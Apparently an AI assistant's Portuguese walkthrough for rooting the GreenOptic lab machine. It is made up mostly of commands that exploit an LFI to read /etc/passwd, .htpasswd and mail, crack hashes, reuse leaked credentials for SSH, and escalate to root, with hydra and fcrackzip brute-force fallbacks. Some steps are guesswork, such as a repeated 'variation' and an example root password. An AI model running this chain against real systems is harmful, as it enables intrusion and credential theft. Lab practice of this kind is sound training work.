Vou detalhar um guia passo a passo COMPLETO para explorar o GreenOptic (172.16.0.113):

## 🔍 FASE 1: RECONHECIMENTO INICIAL

### **Passo 1: Varredura de Portas**
```bash
nmap -sS -A -p- 172.16.0.113
```

### **Passo 2: Varredura de Serviços Web**
```bash
nmap -sV -p 80 --script=http-enum 172.16.0.113
```

## 🎯 FASE 2: EXPLORAÇÃO DA VULNERABILIDADE LFI

### **Passo 3: Testar LFI no Parâmetro include**
```bash
# Teste básico de LFI
curl "http://172.16.0.113/account/index.php?include=../../../../../../etc/passwd"
```

### **Passo 4: Ler Arquivos Sensíveis via LFI**
```bash
# 1. Ler /etc/passwd para ver usuários
curl "http://172.16.0.113/account/index.php?include=../../../../../../etc/passwd"

# 2. Ler .htpasswd para credenciais web
curl "http://172.16.0.113/account/index.php?include=../../../../../../var/www/.htpasswd"

# 3. Ler e-mail do usuário sam
curl "http://172.16.0.113/account/index.php?include=../../../../../../var/mail/sam"

# 4. Tentar ler outros arquivos
curl "http://172.16.0.113/account/index.php?include=../../../../../../etc/hosts"
```

### **Passo 5: Quebrar Hash do .htpasswd**
```bash
# Salvar o hash em um arquivo
echo "staff:$apr1$MNM4eR/f$4c4r8qk8oK8hU0cL.KRcX." > hash.txt

# Quebrar com john the ripper
john --format=md5crypt hash.txt
john --show hash.txt
```

## 🔐 FASE 3: ACESSO AO PAINEL ADMINISTRATIVO

### **Passo 6: Descobrir Subdomínios**
```bash
# Tentar transferência de zona DNS
dig axfr @172.16.0.113 greenoptic.vm

# Ou usar ferramentas de enumeração
gobuster vhost -u http://172.16.0.113 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

### **Passo 7: Acessar o Recovery Plan**
```bash
# Se descobrir recoveryplan.greenoptic.vm, adicione ao /etc/hosts
echo "172.16.0.113 recoveryplan.greenoptic.vm" >> /etc/hosts

# Acessar com as credenciais encontradas
curl -u staff:wheeler http://recoveryplan.greenoptic.vm/
```

### **Passo 8: Baixar e Extrair Arquivo Confidencial**
```bash
# Baixar dpi.zip (se disponível no recovery plan)
wget --user=staff --password=wheeler http://recoveryplan.greenoptic.vm/dpi.zip -O dpi.zip

# Extrair com senha do e-mail
unzip -P HelloSunshine123 dpi.zip
```

## 📡 FASE 4: ANÁLISE DO PCAP E CREDENCIAIS SSH

### **Passo 9: Analisar Arquivo PCAP**
```bash
# Usar tshark para analisar tráfego FTP
tshark -r dpi.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# Procurar especificamente por login FTP
tshark -r dpi.pcap -Y "ftp.request.command == 'USER' || ftp.request.command == 'PASS'" -T fields -e ftp.request.command -e ftp.request.arg

# Análise mais detalhada
tshark -r dpi.pcap -Y "ftp" -V | grep -A5 -B5 "USER\\|PASS"
```

### **Passo 10: Tentativa de Conexão SSH**
```bash
# Conectar com credenciais encontradas no PCAP
ssh alex@172.16.0.113
# Senha: FwejAASD1

# Se não funcionar, tentar variações:
ssh alex@172.16.0.113
# Senha: FwejAASD1 (atenção a maiúsculas/minúsculas)
```

## 👑 FASE 5: ESCALAÇÃO DE PRIVILÉGIOS

### **Passo 11: Enumeração Interna (se conseguir acesso SSH)**
```bash
# Verificar usuário atual
whoami
id

# Verificar comandos sudo permitidos
sudo -l

# Verificar grupos
groups

# Procurar por arquivos sensíveis
find / -name "*.txt" -type f 2>/dev/null
find / -name "flag*" -type f 2>/dev/null
```

### **Passo 12: Explorando Grupo Wireshark**
```bash
# Se estiver no grupo wireshark, capturar tráfego
sudo tshark -i any -w /tmp/captura.pcap -c 50

# Ou usar dumpcap
sudo dumpcap -i any -w /tmp/test.pcap -c 10

# Analisar captura em busca de credenciais
tshark -r /tmp/captura.pcap -Y "http.authbasic || smtp.auth" -V
```

### **Passo 13: Buscar Senha do Root**
```bash
# Procurar por strings em Base64 em arquivos de log
grep -r "base64" /var/log/ 2>/dev/null

# Verificar histórico de comandos
history
cat ~/.bash_history

# Procurar credenciais em arquivos de configuração
find / -name "*.conf" -type f -exec grep -l "password\|pass\|secret" {} \; 2>/dev/null
```

### **Passo 14: Decodificar Senha Root**
```bash
# Quando encontrar string Base64 (exemplo)
echo "Uk9PVF9QQFNTVzByRAo=" | base64 -d
# Resultado: ROOT_P@SSw0rD (exemplo)
```

### **Passo 15: Acesso Root e Flag Final**
```bash
# Fazer login como root
su -
# Inserir senha encontrada

# Ou usar SSH direto como root
ssh root@172.16.0.113

# Buscar a flag
cd /root
ls -la
cat flag.txt
cat proof.txt
cat root.txt

# Se não encontrar arquivo óbvio
find /root -type f -name "*.txt" 2>/dev/null
find /root -type f 2>/dev/null
```

## 🛠️ FASE 6: SOLUÇÃO DE PROBLEMAS

### **Se SSH der "Permission Denied":**
```bash
# Verificar se serviço SSH está ativo
nmap -p 22 172.16.0.113

# Testar com outras credenciais possíveis
ssh sam@172.16.0.113
# Senha: HelloSunshine123

# Verificar se há restrição de IP
ssh -o ConnectTimeout=10 alex@172.16.0.113

# Tentar força bruta (último recurso)
hydra -l alex -P /usr/share/wordlists/rockyou.txt ssh://172.16.0.113
```

### **Se não conseguir extrair o PCAP:**
```bash
# Tentar outras senhas para o ZIP
unzip -P password dpi.zip
unzip -P hello dpi.zip
unzip -P sunshine dpi.zip

# Usar fcrackzip para força bruta
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt dpi.zip
```

**Execute esses passos na ordem exata apresentada.** Se em qualquer etapa você receber um erro específico, me avise para que possamos ajustar a abordagem!
